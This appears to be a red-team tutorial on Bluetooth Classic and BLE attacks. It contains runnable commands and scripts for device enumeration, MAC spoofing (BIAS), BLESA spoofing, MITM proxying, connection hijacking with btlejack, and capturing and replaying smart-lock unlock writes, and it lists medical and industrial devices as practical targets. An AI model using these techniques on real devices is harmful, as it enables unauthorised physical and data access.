Bluetooth Attacks

Overview

Bluetooth comprises two distinct protocols: Classic Bluetooth (BR/EDR — Basic Rate/Enhanced Data Rate) and Bluetooth Low Energy (BLE / Bluetooth 4.x+). They share the 2.4 GHz band and often coexist on the same controller, but have completely different link-layer architectures and attack surfaces. Classic Bluetooth is used for audio (A2DP), file transfer (OBEX/OPP), HID (keyboards, mice), and serial port emulation (SPP). BLE dominates IoT, health monitoring, smart locks, asset trackers, building access, and beacons.

From a red team perspective, BLE is the higher-value target in 2026 due to its widespread use in physical security (smart locks), medical devices, and IIoT environments that are often poorly secured.

BLE Scanning and Enumeration

BLE devices advertise themselves on three fixed advertising channels (37, 38, 39). Passive scanning requires no transmission and is completely invisible to the target device.

# Passive BLE scan (no transmission — stealth):
hcitool lescan --passive
# Output: MAC address, device name (if included in advertisement)

# Active BLE scan (sends scan requests for more data):
hcitool lescan
bluetoothctl scan on

# GATT service enumeration (once device is found):
gatttool -b CC:DD:EE:FF:00:11 -I
# In gatttool interactive:
# > connect
# > primary                          # List all GATT services
# > characteristics                  # List all characteristics
# > char-read-hnd 0x0003             # Read characteristic by handle

# Python bleak — enumerate all GATT services:
python3 - <<'EOF'
import asyncio
from bleak import BleakClient, BleakScanner

async def scan_and_connect(target_mac):
    client = BleakClient(target_mac)
    await client.connect()
    for service in client.services:
        print(f"Service: {service.uuid}")
        for char in service.characteristics:
            print(f"  Char: {char.uuid} | Props: {char.properties}")
            if "read" in char.properties:
                try:
                    val = await client.read_gatt_char(char.uuid)
                    print(f"    Value: {val}")
                except Exception as e:
                    print(f"    Read error: {e}")
    await client.disconnect()

asyncio.run(scan_and_connect("CC:DD:EE:FF:00:11"))
EOF

# Key GATT services to look for (by UUID):
# 0x180A Device Information Service — firmware version, manufacturer, model
# 0x1800 Generic Access — device name, appearance
# 0x180F Battery Service — battery level
# 0x1803 Link Loss Service
# Custom/vendor UUIDs (128-bit) — proprietary functionality, may have auth bypass

# Advertising data decode:
# Advertisement packets contain: Flags, Local Name, Service UUIDs, Manufacturer Data
# Manufacturer data often contains vendor-specific identity or state info
# btlejack or scapy to capture raw advertisement packets

# Scapy BLE advertisement sniff:
python3 - <<'EOF'
from scapy.all import *
from scapy.layers.bluetooth4LE import *

def ble_handler(pkt):
    if BTLE_ADV in pkt:
        print(f"ADV from: {pkt.AdvA} Type: {pkt.PDU_type}")
        if BTLE_SCAN_RSP in pkt:
            print(f"  Scan Response: {bytes(pkt.data).hex()}")

sniff(iface="hci0", prn=ble_handler, store=0)
EOF

BIAS Attack — Bluetooth Impersonation

BIAS (Bluetooth Impersonation AttackS, CVE-2020-10135) exploits a flaw in the Bluetooth Classic BR/EDR secure connection procedure. An attacker can impersonate a previously paired device without knowing the long-term key (LTK), bypassing authentication entirely. Affects Bluetooth 1.0–5.0 in most implementations; patched in 2020 but unpatched firmware remains widespread.

# BIAS attack overview:
# Normal pairing: both devices authenticate each other (mutual authentication)
# BIAS bypass: during reconnection, master can skip authentication challenge
# Attacker claims to be a previously paired device → gains access without the LTK

# Prerequisites:
# - Know the MAC address of a previously paired trusted device (e.g., corporate headset)
# - MAC can be obtained by: scanning nearby BT devices, sniffing BT traffic, OSINT
# - Target must be in connectable/pairable range

# BIAS affects:
# - All Bluetooth Classic (BR/EDR) connections
# - Headphones, keyboards, mice, phones, laptops connecting to corporate endpoints
# - Most notable: impersonating a corporate headset to access a paired laptop

# Tool: bias-poc (proof of concept by researchers):
# https://github.com/francozappa/bias
# Requires: Ubertooth One or modified BT controller with raw HCI access

# Practical attack flow:
# 1. Obtain MAC of target's trusted device (sniff, scan, or physical inspection)
# 2. Spoof your adapter MAC to match the trusted device:
hciconfig hci0 down
bdaddr -i hci0 AA:BB:CC:DD:EE:FF     # Spoof MAC (bdaddr tool)
hciconfig hci0 up

# 3. Attempt connection claiming no MITM protection needed (skip auth):
# Python HCI-level script to send LMP_au_rand with zero random value
# See bias-poc implementation for HCI command specifics

# 4. If vulnerable, connection succeeds without LTK — full BR/EDR access
# Access: profiles available on that device (HFP, A2DP, HID, OBEX, SPP)

# Affected vendors (CVE-2020-10135 — patch status as of 2024):
# Many consumer devices never received patches
# Check firmware dates: pre-May 2020 = almost certainly unpatched
# Industrial/embedded BT modules: very rarely patched

BLESA — BLE Spoofing Attack

BLESA (Bluetooth Low Energy Spoofing Attack, 2020) targets the BLE reconnection procedure. During reconnection, some implementations fail to properly re-authenticate the peer device, allowing a spoofed device to inject malicious data. Affects many BLE implementations that use the "Just Works" pairing model.

# BLESA targets the reconnection (not initial pairing):
# After initial pairing, BLE devices store a Long Term Key (LTK)
# Reconnection should verify the peer using the LTK
# Vulnerable implementations: accept reconnection without full LTK verification
# Attacker: send spoofed reconnection as the paired device → inject data

# Affected:
# iOS (pre-iOS 13.4), Android (Linux BlueZ <5.54), many embedded BLE stacks
# Nordic (SDK <15.3), Cypress/Infineon (affected), Silicon Labs (affected in some builds)

# Attack scenario for physical security:
# Smart lock paired with phone via BLE
# Lock stores phone's BLE MAC + LTK
# Attacker spoofs phone MAC → sends reconnection → if lock is vulnerable, accepts data
# Inject commands: unlock, disarm, configuration changes

# Practical BLESA test using gattacker:
# gattacker — BLE MITM and spoofing tool:
npm install -g gattacker

# Step 1: Scan and capture target device advertisement:
gattacker scan                         # Captures device profiles

# Step 2: Spoof the device by replaying advertisement data:
gattacker advertise --target CC:DD:EE:FF:00:11

# Step 3: If vulnerable, connecting host re-connects to you
# Your spoofed device can now respond to GATT read/write operations

# Linux BlueZ BLESA mitigation check:
hciconfig hci0 version                 # Check BlueZ version
bluetoothctl --version
# BlueZ >= 5.54 includes BLESA mitigations for central role
# Peripheral role still may be affected depending on application-level checks

BLE MITM — Pairing and GATT Interception

BLE MITM attacks intercept the pairing process or ongoing GATT communications. "Just Works" pairing (common in IoT) provides no MITM protection. An attacker between the central (phone/gateway) and peripheral (sensor/device) can read and modify all data.

# BLE pairing security models:
# Just Works     — no PIN/passkey, no MITM protection (most IoT)
# Passkey Entry  — one device shows 6-digit number, other enters it (some MITM protection)
# Numeric Comparison — both show same number, user confirms (BLE 4.2+ LE Secure Connections)
# OOB            — Out-of-Band (NFC, QR code) — requires physical OOB access

# Just Works MITM setup with btlejuice (NodeJS):
# Requires: 2x BLE USB adapters
npm install -g btlejuice btlejuice-proxy

# Terminal 1 — proxy (on machine with 2 BLE adapters):
sudo btlejuice-proxy

# Terminal 2 — web interface:
sudo btlejuice
# Web UI at http://localhost:8080

# In btlejuice web UI:
# 1. Scan → select target peripheral
# 2. Connect → btlejuice proxies between real device and spoofed device
# 3. Observe all GATT reads/writes in real time
# 4. Modify values before forwarding (MITM)

# GATTacker — similar to btlejuice, more scriptable:
# gattacker scan → capture profiles
# gattacker advertise --target BSSID → spoof target
# Script to modify specific characteristics:
cat > /tmp/gattacker-hook.js <<'EOF'
module.exports = {
  onReadRequest: function(uuid, data) {
    console.log('Read on ' + uuid + ': ' + data.toString('hex'));
    return data;  // Return original or modified data
  },
  onWriteRequest: function(uuid, data) {
    console.log('Write on ' + uuid + ': ' + data.toString('hex'));
    // Modify data here before forwarding:
    return data;
  }
};
EOF

# Sniffing BLE with nRF52840 + Wireshark:
# Follow a connection from the start (must capture initial PDU/CRCINIT):
# In Wireshark BLE sniffer:
# 1. Set channel to 37/38/39 to capture advertising
# 2. Once connection event detected, sniffer follows the connection
# 3. Decrypts if LTK known (provide in Wireshark BLE preferences)

Bluetooth Classic Sniffing with Ubertooth

Ubertooth One is a 2.4 GHz development board purpose-built for Bluetooth research. It can sniff Bluetooth Classic in promiscuous mode (following piconets) and BLE. Bluetooth Classic uses adaptive FHSS (79 channels), making full capture harder than BLE.

# Ubertooth basic receive test:
ubertooth-util -v                      # Check firmware version
ubertooth-util -s                      # Check status

# Ubertooth BLE sniffing — promiscuous mode (captures all advertising):
ubertooth-btle -p                      # Promiscuous — capture all BLE adverts
ubertooth-btle -f                      # Follow connections (connects to first seen)
ubertooth-btle -f -c capture.pcap     # Save to PCAP for Wireshark

# Follow a specific BLE device by MAC:
ubertooth-btle -t CC:DD:EE:FF:00:11   # Follow target MAC
# Wait for the device to connect to a central — Ubertooth follows the connection

# Bluetooth Classic (BR/EDR) sniffing:
# AFSK hopping makes full capture hard without knowing the clock and address
ubertooth-follow -i hci0 -t AA:BB:CC:DD:EE:FF   # Follow specific BT Classic connection
# Requires: knowing target's BT address and being able to observe at least one connection

# HCI dump — capture all HCI traffic from local adapter:
hcidump -i hci0 -X                     # Hex dump of all HCI frames
hcidump -i hci0 -w capture.hci        # Write to file for analysis

# btlejack — BLE connection sniffing + hijacking (nRF52840-based):
# https://github.com/virtualabs/btlejack
pip install btlejack
btlejack -d /dev/ttyACM0 -s           # Scan for connections
btlejack -d /dev/ttyACM0 -f AA:BB:CC:DD:EE:FF  # Follow specific device
btlejack -d /dev/ttyACM0 -j AA:BB:CC:DD:EE:FF  # Attempt connection hijack

# BLE connection hijacking (btlejack):
# Works by capturing connection parameters (access address, hop interval, channel map)
# Then injecting into the connection at the right moment
# Requires: very precise timing (microsecond-level)
# Result: take over a BLE connection mid-session

Bluetooth LE Device Attacks — Smart Locks and Access Control

BLE-based smart locks and access control systems are high-value targets in physical engagements. Many have authentication implemented at the application layer over unencrypted or weakly encrypted GATT, making them vulnerable to replay, brute force, and MITM attacks.

# Smart lock attack workflow:
# 1. Identify target lock model (from brand on lock, or advertisement data)
# 2. Enumerate GATT services + characteristics
# 3. Sniff legitimate unlock operation (if possible via MITM or app traffic)
# 4. Replay or reverse-engineer unlock command

# Step 1: Scan for lock advertisement:
hcitool lescan | grep -i "lock\|door\|access"
bluetoothctl scan on

# Step 2: Enumerate services:
gatttool -b CC:DD:EE:FF:00:11 --primary
gatttool -b CC:DD:EE:FF:00:11 --characteristics

# Step 3: Read all readable characteristics to find auth mechanism:
python3 - <<'EOF'
import asyncio
from bleak import BleakClient

async def read_all(mac):
    async with BleakClient(mac) as client:
        for service in client.services:
            for char in service.characteristics:
                if "read" in char.properties:
                    try:
                        data = await client.read_gatt_char(char.uuid)
                        print(f"{char.uuid}: {data.hex()}")
                    except:
                        pass

asyncio.run(read_all("CC:DD:EE:FF:00:11"))
EOF

# Step 4: Monitor notifications (lock state changes):
gatttool -b CC:DD:EE:FF:00:11 --char-write-req --handle=0x0012 --value=0100
# Enable notifications on handle 0x0012 (CCCD) — receive state updates

# Step 5: Capture unlock command via app MITM:
# Use gattacker or btlejuice to proxy between app and lock
# Capture exact GATT write that triggers unlock
# Replay that write directly to the lock (no app needed)

# Common vulnerabilities found in BLE locks:
# - No authentication: any device can write unlock command
# - Weak "challenge" using predictable values (timestamp, rolling counter mod 256)
# - Fixed token: unlock command never changes, easily replayed
# - No encryption: GATT data in cleartext, capture with nRF sniffer
# - Default PIN/password: manufacturer default never changed

BlueBorne and Legacy Vulnerabilities

# BlueBorne (2017) — remote code execution via Bluetooth without pairing:
# CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, CVE-2017-0785 (Android)
# CVE-2017-14315 (iOS) CVE-2017-8628 (Windows) CVE-2017-1000251 (Linux)
# AFFECTS: all major platforms at time of disclosure
# Current status (2026): fully patched on modern OS, but:
# - Embedded Linux without security updates (industrial, automotive, medical)
# - Android 4.x/5.x devices still in use in developing markets
# - IoT gateways and hubs running old Linux kernels

# BlueBorne attack prerequisites:
# - Target must have Bluetooth ON (no pairing required, no user interaction)
# - Attacker must be in BT range
# - Target must be unpatched

# Armis BlueBorne scanner (check if device is vulnerable):
git clone https://github.com/ArmisSecurity/blueborne
cd blueborne/scanner
python scanner.py CC:DD:EE:FF:00:11   # Check specific MAC for BlueBorne vulns

# L2CAP information disclosure (CVE-2017-0785):
# Request L2CAP information before pairing — leaks stack memory
# May reveal heap addresses useful for exploitation

# Android SDP information leak (CVE-2017-0782):
# Send malformed SDP browse group request
# Causes heap data disclosure including memory pointers

# Practical 2026 BlueBorne targets:
# Raspberry Pi-based industrial gateways (may run old Raspbian/Raspberry Pi OS)
# Old Android tablets used as kiosks
# Medical device Bluetooth modules (long device lifetimes = old firmware)
# Automotive infotainment units (infrequent firmware updates)
